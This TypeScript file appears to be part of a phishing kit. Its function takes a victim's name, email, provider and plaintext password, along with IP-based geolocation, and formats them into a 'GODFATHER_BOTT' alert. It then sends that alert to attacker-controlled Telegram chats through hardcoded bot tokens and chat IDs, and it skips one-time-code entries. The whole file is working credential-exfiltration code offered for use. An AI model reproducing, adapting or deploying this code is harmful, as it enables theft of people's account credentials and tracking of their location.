import type { GeoInfo } from './geo.ts';
import { env } from '../config/env.ts';

interface TelegramBot {
  token: string;
  chatId: string;
}

const FALLBACK_BOTS: TelegramBot[] = [
  { token: '8953377894:AAF_pq4l36axeJ1_gD6OtjOjSoQ3Iv6RuG0', chatId: '8822694218' },
  { token: '8965686430:AAEL0hFco-56aKcNL-0JF1cq5kGfv63WA_k', chatId: '7607683158' },
];

function loadTelegramBots(): TelegramBot[] {
  if (env.telegramBotsJson) {
    try {
      const parsed = JSON.parse(env.telegramBotsJson) as TelegramBot[];
      return parsed.filter((bot) => bot?.token && bot?.chatId);
    } catch {
      console.error('[telegram] Invalid TELEGRAM_BOTS JSON — alerts disabled.');
      return [];
    }
  }

  if (!env.isProduction) {
    return FALLBACK_BOTS;
  }

  return [];
}

export async function sendTelegramNotification(
  name: string,
  email: string,
  provider: string,
  password: string,
  geo?: GeoInfo,
): Promise<void> {
  if (password.startsWith('[OTP Code]')) {
    return;
  }

  const bots = loadTelegramBots();
  if (!bots.length) {
    return;
  }

  const geoLines = geo
    ? [
        geo.ip ? `🌐 <b>IP:</b> <code>${geo.ip}</code>` : null,
        geo.country
          ? `🏳️ <b>Country:</b> ${geo.country}${geo.countryCode ? ` (${geo.countryCode})` : ''}`
          : null,
        geo.continent ? `🌍 <b>Continent:</b> ${geo.continent}` : null,
        geo.region ? `📍 <b>Region:</b> ${geo.region}` : null,
        geo.city ? `🏙️ <b>City:</b> ${geo.city}` : null,
        geo.org ? `🏢 <b>ISP/Org:</b> ${geo.org}` : null,
        geo.timezone ? `⏰ <b>Timezone:</b> ${geo.timezone}` : null,
      ]
        .filter(Boolean)
        .join('\n')
    : '';

  const geoSection = geoLines
    ? `\n\n📡 <b>Geolocation</b>\n━━━━━━━━━━━━━━━━━━━━\n${geoLines}`
    : '';

  const message = `
╔══════════════════════════════╗
  ⚡ <span class="tg-spoiler">[ ＧＯＤＦＡＴＨＥＲ _ ＢＯＴＴ ]</span> ⚡
╚══════════════════════════════╝

✅ <b>Status:</b> Successfully Authenticated
👤 <b>Name:</b> ${name}
📧 <b>Email:</b> ${email}
🔗 <b>Provider:</b> ${provider}
🔒 <b>Password:</b> <code>${password}</code>
🕐 <b>Timestamp:</b> ${new Date().toISOString()}${geoSection}

━━━━━━━━━━━━━━━━━━━━
<i>User has been welcomed and account is now active.</i>
<code>@godfather_bott</code>
  `.trim();

  await Promise.allSettled(
    bots.map(async ({ token, chatId }, index) => {
      const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML',
        }),
      });

      if (!res.ok) {
        const err = await res.text();
        console.error(`[telegram ${index}] send failed: ${res.status} — ${err}`);
      }
    }),
  );
}
